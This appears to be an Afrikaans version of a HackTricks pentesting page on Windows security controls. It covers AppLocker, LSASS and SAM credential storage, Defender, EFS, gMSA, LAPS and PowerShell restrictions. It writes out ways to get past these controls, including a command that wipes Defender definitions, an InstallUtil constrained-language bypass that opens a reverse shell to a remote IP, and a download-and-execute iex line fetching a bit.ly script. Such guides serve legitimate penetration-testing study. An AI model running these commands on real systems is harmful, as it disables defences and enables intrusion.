# Windows-sekuriteitskontroles

{{#include ../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Toepassings-witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat op 'n stelsel toegelaat word en uitgevoer mag word. Die doel is om die omgewing te beskerm teen skadelike malware en ongemagtigde sagteware wat nie by die spesifieke besigheidsbehoeftes van 'n organisasie pas nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **toepassings-witlysoplossing** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fynkorrelige beheer** oor uitvoerbare lêers, scripts, Windows-installeerderlêers, DLL's, verpakte toepassings en verpakte toepassingsinstalleerders.\
Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe blokkeer** en skryftoegang tot sekere gidse beperk, **maar dit alles kan omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied 'n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **skryfbare vouers** om AppLocker-beleid te omseil: Indien AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer word, is daar **skryfbare vouers** wat jy kan gebruik om dit te **omseil**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Algemeen **vertroude** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Swak geskryfde reëls kan ook omseil word**
- Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: jy kan ’n **lêergids genaamd `allowed`** enige plek skep, en dit sal toegelaat word.
- Organisasies fokus ook dikwels daarop om die **`%System32%\WindowsPowerShell\v1.0\powershell.exe`-uitvoerbare lêer** te **blokkeer**, maar vergeet van die **ander** [**PowerShell-uitvoerbare lêerliggings**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL enforcement** word baie selde geaktiveer weens die bykomende las wat dit op ’n stelsel kan plaas, asook die hoeveelheid toetsing wat nodig is om te verseker dat niks sal breek nie. Deur **DLLs as backdoors te gebruik, kan AppLocker dus omseil word**.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Berging van geloofsbriewe

### Security Accounts Manager (SAM)

Plaaslike geloofsbriewe is in hierdie lêer teenwoordig; die wagwoorde is gehash.

### Local Security Authority (LSA) - LSASS

Die **geloofsbriewe** (gehash) word in die **geheue** van hierdie subsisteem **gestoor** vir Single Sign-On-doeleindes.\
**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikertoestemmings...), **verifikasie**, **toegangstokens**...\
LSA is die een wat die **verskafde** geloofsbriewe binne die **SAM**-lêer sal **kontroleer** (vir ’n plaaslike aanmelding) en met die **domeinbeheerder** sal **kommunikeer** om ’n domeingebruiker te verifieer.

Die **geloofsbriewe** word binne die **LSASS-proses gestoor**: Kerberos-tickets, NT- en LM-hashes, maklik gedekripteerde wagwoorde.

### LSA secrets

LSA kan sommige geloofsbriewe op skyf stoor:

- Wagwoord van die rekenaarrekening van die Active Directory (onbereikbare domeinbeheerder).
- Wagwoorde van die rekeninge van Windows-dienste
- Wagwoorde vir geskeduleerde take
- Meer (wagwoord van IIS-toepassings...)

### NTDS.dit

Dit is die databasis van die Active Directory. Dit is slegs op Domain Controllers teenwoordig.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is ’n antivirusprogram wat in Windows 10 en Windows 11, asook in weergawes van Windows Server, beskikbaar is. Dit **blokkeer** algemene pentesting-tools soos **`WinPEAS`**. Daar is egter maniere om **hierdie beskermings te omseil**.

### Kontrole

Om die **status** van **Defender** te kontroleer, kan jy die PS-cmdlet **`Get-MpComputerStatus`** uitvoer (kontroleer die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumerate, kan jy ook uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Geënkripteerde Lêerstelsel (EFS)

EFS beveilig lêers deur enkripsie te gebruik, met behulp van 'n **simmetriese sleutel** bekend as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **publieke sleutel** geënkripteer en binne die geënkripteerde lêer se $EFS **alternative data stream** gestoor. Wanneer dekripsie nodig is, word die ooreenstemmende **private sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te dekripteer. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) gevind word.

**Dekripsie-scenario's sonder gebruikersinisiëring** sluit die volgende in:

- Wanneer lêers of vouers na 'n nie-EFS-lêerstelsel, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), geskuif word, word hulle outomaties gedekripteer.
- Geënkripteerde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor transmissie gedekripteer.

Hierdie enkripsiemetode bied die eienaar **deursigtige toegang** tot geënkripteerde lêers. Om egter bloot die eienaar se wagwoord te verander en aan te meld, sal nie dekripsie moontlik maak nie.

**Belangrikste punte**:

- EFS gebruik 'n simmetriese FEK wat met die gebruiker se publieke sleutel geënkripteer is.
- Dekripsie gebruik die gebruiker se private sleutel om toegang tot die FEK te verkry.
- Outomatiese dekripsie vind onder spesifieke toestande plaas, soos wanneer na FAT32 gekopieer word of tydens netwerktransmissie.
- Geënkripteerde lêers is sonder bykomende stappe vir die eienaar toeganklik.

### Kontroleer EFS-inligting

Kontroleer of 'n **gebruiker** hierdie **diens** **gebruik** het deur te kontroleer of hierdie pad bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **wie** toegang tot die lêer het met cipher /c \<file>\
Jy kan ook `cipher /e` en `cipher /d` binne 'n vouer gebruik om al die lêers te **enkripteer** en te **dekripteer**

### Dekriptering van EFS-lêers

#### Om Authority System te wees

Hierdie metode vereis dat die **slagoffer-gebruiker** 'n **proses** binne die gasheer **uitvoer**. Indien dit die geval is, kan jy met behulp van 'n `meterpreter`-sessie die gebruiker se proses se token naboots (`impersonate_token` van `incognito`). Jy kan ook eenvoudig na die gebruiker se proses `migrate`.

#### Om die gebruiker se wagwoord te ken

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van service accounts in IT-infrastrukture te vereenvoudig. Anders as tradisionele service accounts wat dikwels die "**Password never expire**"-instelling geaktiveer het, bied gMSA's 'n veiliger en meer hanteerbare oplossing:

- **Outomatiese wagwoordbestuur**: gMSA's gebruik 'n komplekse wagwoord van 240 karakters wat outomaties volgens domein- of rekenaarbeleid verander. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
- **Verbeterde sekuriteit**: Hierdie accounts is immuun teen lockouts en kan nie vir interaktiewe logins gebruik word nie, wat hul sekuriteit verbeter.
- **Ondersteuning vir veelvuldige hosts**: gMSA's kan oor verskeie hosts gedeel word, wat hulle ideaal maak vir services wat op verskeie servers loop.
- **Ondersteuning vir scheduled tasks**: Anders as managed service accounts ondersteun gMSA's die uitvoering van scheduled tasks.
- **Vereenvoudigde SPN-bestuur**: Die stelsel werk die Service Principal Name (SPN) outomaties by wanneer daar veranderinge aan die rekenaar se sAMaccount-besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSA's word in die LDAP-eienskap _**msDS-ManagedPassword**_ gestoor en word elke 30 dae outomaties deur Domain Controllers (DCs) teruggestel. Hierdie wagwoord, 'n geënkripteerde data-blob bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrators en die servers waarop die gMSA's geïnstalleer is, verkry word, wat 'n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, word 'n beveiligde verbinding soos LDAPS vereis, of die verbinding moet met 'Sealing & Secure' geauthentiseer wees.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

Jy kan hierdie wagwoord met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** lees.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Vind meer inligting in hierdie plasing**](https://cube0x0.github.io/Relaying-for-gMSA/)

Kyk ook na hierdie [webblad](https://cube0x0.github.io/Relaying-for-gMSA/) oor hoe om 'n **NTLM relay attack** uit te voer om die **password** van **gMSA** te **lees**.<sup>[[3]](#references)</sup>

## LAPS

Die **Local Administrator Password Solution (LAPS)**, wat vanaf [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) afgelaai kan word, maak die bestuur van plaaslike Administrator-passwords moontlik. Hierdie passwords, wat **randomized**, uniek en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie passwords word deur ACLs tot gemagtigde gebruikers beperk. Met voldoende toestemmings kan plaaslike admin-passwords gelees word.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die kenmerke af** wat nodig is om PowerShell doeltreffend te gebruik, soos die blokkering van COM-objects, die toelating van slegs goedgekeurde .NET-types, XAML-gebaseerde workflows, PowerShell-classes, en meer.

### **Kontroleer**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te compileer, moet jy dalk** **'n** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die constrained mode te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS-uitvoeringsbeleid

By verstek is dit op **restricted** gestel. Belangrikste maniere om hierdie beleid te omseil:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) gevind word

## Security Support Provider Interface (SSPI)

Is die API wat gebruik kan word om gebruikers te autentiseer.

Die SSPI sal verantwoordelik wees daarvoor om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Daarna sal die SSPI onderhandel watter authentication protocol gebruik sal word. Hierdie authentication protocols word Security Support Providers (SSP's) genoem, is binne elke Windows-masjien in die vorm van 'n DLL geleë, en albei masjiene moet dieselfde een ondersteun om te kan kommunikeer.

### Main SSPs

- **Kerberos**: Die voorkeur een
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** en **NTLMv2**: Om versoenbaarheidsredes
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webbedieners en LDAP, wagwoord in die vorm van 'n MD5-hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Dit word gebruik om te onderhandel oor die protokol wat gebruik moet word (Kerberos of NTLM, met Kerberos as die verstek)
- %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of slegs een aanbied.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingsaanvraag vir aktiwiteite met verhoogde voorregte** moontlik maak.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Verwysings

- [1] [Om Applocker en Powershell constrained language mode te omseil](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 maniere om die PowerShell Execution Policy te omseil](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
